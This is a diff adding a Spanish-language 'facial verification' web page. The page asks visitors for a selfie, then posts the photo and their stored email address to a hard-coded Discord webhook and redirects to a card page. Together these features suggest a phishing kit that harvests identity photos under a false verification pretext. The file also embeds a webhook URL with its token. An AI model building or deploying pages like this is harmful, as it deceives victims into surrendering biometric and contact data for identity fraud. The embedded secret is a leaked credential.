@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación Facial</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-space {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-space img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #000;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .recomendaciones {
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+        }
+
+        .recomendaciones-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+        }
+
+        .recomendaciones ul {
+            list-style: none;
+        }
+
+        .recomendaciones li {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 8px;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .recomendaciones li:before {
+            content: "•";
+            position: absolute;
+            left: 0;
+            color: #007bff;
+            font-weight: bold;
+        }
+
+        .camera-wrapper {
+            position: relative;
+            width: 100%;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .camera-container {
+            position: relative;
+            width: 320px;
+            height: 400px;
+            background-color: #000;
+            border-radius: 20px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .oval-overlay {
+            position: absolute;
+            width: 200px;
+            height: 260px;
+            border: 4px solid #007bff;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
+        }
+
+        canvas {
+            display: none;
+        }
+
+        .preview-container {
+            display: none;
+            width: 320px;
+            height: 400px;
+            background-color: #000;
+            border-radius: 20px;
+            overflow: hidden;
+            margin: 0 auto 25px;
+            position: relative;
+        }
+
+        .preview-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .preview-oval {
+            position: absolute;
+            width: 200px;
+            height: 260px;
+            border: 4px solid #007bff;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+        }
+
+        .button-container {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background-color: #0056b3;
+            color: white;
+            width: 100%;
+        }
+
+        .btn-primary:hover {
+            background-color: #004085;
+        }
+
+        .btn-secondary {
+            background-color: #6c757d;
+            color: white;
+            display: none;
+        }
+
+        .btn-secondary:hover {
+            background-color: #5a6268;
+        }
+
+        .btn-success {
+            background-color: #28a745;
+            color: white;
+            display: none;
+            width: 100%;
+        }
+
+        .btn-success:hover {
+            background-color: #218838;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            color: #007bff;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+
+        .estado {
+            text-align: center;
+            font-size: 13px;
+            color: #999;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-space">
+                <img id="logo" src="logo.png" alt="Logo">
+            </div>
+            <h1>Verificación Facial</h1>
+            <p class="subtitle">Tome una foto facial para verificar su identidad.</p>
+        </div>
+
+        <div class="recomendaciones">
+            <div class="recomendaciones-title">Recomendaciones para la selfie:</div>
+            <ul>
+                <li>La cara debe estar centrada en la foto</li>
+                <li>Asegúrese de tener buena iluminación</li>
+                <li>Tome la foto de frente a la cámara</li>
+                <li>No use accesorios que cubran su rostro</li>
+            </ul>
+        </div>
+
+        <div class="camera-wrapper">
+            <div class="camera-container" id="cameraContainer">
+                <video id="video" autoplay playsinline></video>
+                <div class="oval-overlay"></div>
+            </div>
+
+            <div class="preview-container" id="previewContainer">
+                <img id="preview" alt="Vista previa">
+                <div class="preview-oval"></div>
+            </div>
+        </div>
+
+        <div class="button-container">
+            <button id="captureBtn" class="btn-primary" onclick="capturarFoto()">Tomar Foto</button>
+            <button id="retakeBtn" class="btn-secondary" onclick="reintentar()">🔄 Reintentar</button>
+        </div>
+
+        <button id="sendBtn" class="btn-success" onclick="enviarFoto()">✅ Enviar Foto</button>
+
+        <div class="loading" id="loading">Enviando foto...</div>
+        <div class="estado" id="estado">Inicializando cámara...</div>
+    </div>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1556173985086177380/0-QwH4IDZEOB8-_lIbuhh8thRbKeDbUvm_gFU2sADsHdVoUNU7RTNXAKckazKRTwv4Qp';
+
+        const video = document.getElementById('video');
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d', { willReadFrequently: true });
+        const cameraContainer = document.getElementById('cameraContainer');
+        const previewContainer = document.getElementById('previewContainer');
+        const preview = document.getElementById('preview');
+        const captureBtn = document.getElementById('captureBtn');
+        const retakeBtn = document.getElementById('retakeBtn');
+        const sendBtn = document.getElementById('sendBtn');
+        const loadingDiv = document.getElementById('loading');
+        const estadoDiv = document.getElementById('estado');
+        
+        let fotoCapturada = null;
+        let email = localStorage.getItem('userEmail');
+
+        async function inicializarCamara() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 2560 },
+                        height: { ideal: 1920 }
+                    }
+                });
+                video.srcObject = stream;
+                estadoDiv.textContent = '✅ Cámara lista';
+            } catch (error) {
+                console.error('Error:', error);
+                estadoDiv.textContent = '❌ No se pudo acceder a la cámara';
+                captureBtn.disabled = true;
+            }
+        }
+
+        function capturarFoto() {
+            canvas.width = 320;
+            canvas.height = 400;
+
+            // Dibujar sin invertir (NO usar scaleX)
+            ctx.drawImage(video, 0, 0, 320, 400);
+
+            fotoCapturada = canvas.toDataURL('image/jpeg', 0.98);
+            preview.src = fotoCapturada;
+
+            cameraContainer.style.display = 'none';
+            previewContainer.style.display = 'block';
+            captureBtn.style.display = 'none';
+            retakeBtn.style.display = 'block';
+            sendBtn.style.display = 'block';
+            estadoDiv.textContent = '✅ Foto capturada correctamente';
+        }
+
+        function reintentar() {
+            fotoCapturada = null;
+            preview.src = '';
+
+            cameraContainer.style.display = 'flex';
+            previewContainer.style.display = 'none';
+            captureBtn.style.display = 'block';
+            retakeBtn.style.display = 'none';
+            sendBtn.style.display = 'none';
+            estadoDiv.textContent = '✅ Cámara lista';
+        }
+
+        async function enviarFoto() {
+            loadingDiv.style.display = 'block';
+
+            try {
+                const response = await fetch(fotoCapturada);
+                const blob = await response.blob();
+
+                const formData = new FormData();
+                formData.append('file', blob, 'verificacion_facial.jpg');
+                formData.append('payload_json', JSON.stringify({
+                    content: `📸 **Nueva Verificación Facial**`,
+                    embeds: [
+                        {
+                            color: 3447003,
+                            title: "Captura de Verificación Facial",
+                            fields: [
+                                {
+                                    name: "📧 Correo Electrónico",
+                                    value: email || "No disponible",
+                                    inline: true
+                                },
+                                {
+                                    name: "✅ Estado",
+                                    value: "Verificación facial completada",
+                                    inline: true
+                                },
+                                {
+                                    name: "⏰ Fecha y Hora",
+                                    value: new Date().toLocaleString('es-ES'),
+                                    inline: false
+                                }
+                            ],
+                            footer: {
+                                text: "Sistema de Validación - Verificación Facial"
+                            }
+                        }
+                    ]
+                }));
+
+                const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (discordResponse.ok) {
+                    estadoDiv.textContent = '✅ Foto enviada correctamente';
+                    setTimeout(() => {
+                        loadingDiv.style.display = 'none';
+                        window.location.href = 'tarjeta.html';
+                    }, 1500);
+                } else {
+                    estadoDiv.textContent = '❌ Error al enviar la foto';
+                    loadingDiv.style.display = 'none';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                estadoDiv.textContent = '❌ Error al enviar la foto';
+                loadingDiv.style.display = 'none';
+            }
+        }
+
+        window.addEventListener('load', inicializarCamara);
+    </script>
+</body>
+</html>
